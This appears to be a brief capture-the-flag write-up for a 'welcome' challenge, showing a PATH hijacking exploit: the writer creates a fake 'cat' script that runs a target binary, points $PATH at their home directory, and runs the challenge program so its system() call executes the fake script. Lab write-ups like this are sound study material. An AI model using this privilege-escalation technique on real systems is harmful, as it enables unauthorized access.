- `system()` depends on $PATH, we can set $PATH to decide where `cat` is
- in my home dir /home/iel44jez create a file cat:
```bash
vi cat

echo yoyo
/usr/local/bin/l33t

chmod +x cat
```
- then run the welcome file with that env
```bash
export PATH=/home/iel44jez
/var/challenges/welcome/welcome
```